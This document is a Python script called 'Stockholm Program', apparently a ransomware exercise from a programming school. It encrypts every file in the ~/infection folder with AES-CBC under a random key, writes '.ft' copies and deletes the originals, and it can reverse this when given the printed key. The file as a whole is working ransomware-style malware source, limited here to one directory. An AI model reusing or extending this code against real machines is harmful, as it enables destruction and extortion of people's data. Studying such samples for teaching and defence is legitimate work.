#!/usr/bin/env python3
import os
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

VERSION = "Stockholm Program v1.0"
INFECTION_DIR = os.path.expanduser("~/infection")

def encrypt(key, filename):
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        with open(filename, "rb") as f:
            data = f.read()
        encrypted_data = cipher.encrypt(pad(data, AES.block_size))
        with open(filename + ".ft", "wb") as f:
            f.write(cipher.iv + encrypted_data)  # No newline!
        os.remove(filename)
    except Exception as e:
        print(f"error while encrypting {e}")


def decrypt(key, filename):
    print(f"[...] begin decrypting {filename}")
    try:
        with open(filename, "rb") as f:
            iv = f.read(16)
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(data), AES.block_size)

        name = filename.replace(".ft", "")
        with open(name, "wb") as f:
            f.write(plaintext)
        os.remove(filename)
        print("file decrypted successfully")
    except Exception as e:
        print(f"error decrypting {filename} : {e}")


def dir_process(reverse, key=None):
    if not os.path.exists(INFECTION_DIR):
        print(f"Infection directory not found: {INFECTION_DIR}")
        return
    for file_name in os.listdir(INFECTION_DIR):
        full_path = os.path.join(INFECTION_DIR, file_name)
        if not reverse and os.path.isfile(full_path) and not full_path.endswith(".ft"):
            encrypt(key, filename=full_path)
        if reverse and os.path.isfile(full_path) and full_path.endswith(".ft"):
            decrypt(key, filename=full_path)




def main():
    parser = argparse.ArgumentParser(
        description="Stockholm Encryption Program", add_help=False
    )
    parser.add_argument("-h", "--help", action="store_true", help="Show help message")
    parser.add_argument("-v", "--version", action="store_true", help="Show program version")
    parser.add_argument(
        "-r", "--reverse", metavar="KEY", help="Reverse (decrypt) using the provided 32-character hex key"
    )
    args = parser.parse_args()

    if args.help:
        print(
            """
Stockholm Program
Usage: ./stockholm.py [options]
Options:
  -h, --help        Show help message
  -v, --version     Show program version
  -r, --reverse     Reverse the infection (decrypt) - requires key
"""
        )
        return
    if args.version:
        print(VERSION)
        return

    if args.reverse:
        try:
            key = bytes.fromhex(args.reverse)
            if len(key) != 16:
                raise ValueError
            dir_process(reverse=True, key=key)
        except Exception:
            print("[-] Invalid key: must be 32-character hex (16 bytes).")
    else:
        key = os.urandom(16)
        print(f"[+] Encryption key (save this!): {key.hex()}")
        dir_process(reverse=False, key=key)


main()